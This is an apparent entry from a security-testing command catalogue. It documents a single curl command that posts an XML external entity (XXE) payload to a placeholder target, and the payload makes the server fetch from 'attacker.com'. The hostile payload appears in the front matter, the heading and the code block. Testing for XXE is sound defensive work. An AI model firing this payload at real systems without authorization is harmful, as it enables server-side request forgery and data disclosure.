---
id: c-curl-xxe-test
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<?xml
  version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM
  "http://attacker.com">]><root>&xxe;</root>'
  http://target-subdomain.example.com/upload
tags:
  - xxe
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.290Z'
verified: false
validated: true
submitted: true
---
# curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com">]><root>&xxe;</root>' http://target-subdomain.example.com/upload

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com">]><root>&xxe;</root>' http://target-subdomain.example.com/upload
```

## Description

Tests for external entity XXE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | XXE payload | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

## Expected Output

No fetch if blocked.

## Related

- [[procedures/Attempt-XXE-Exploitation]]
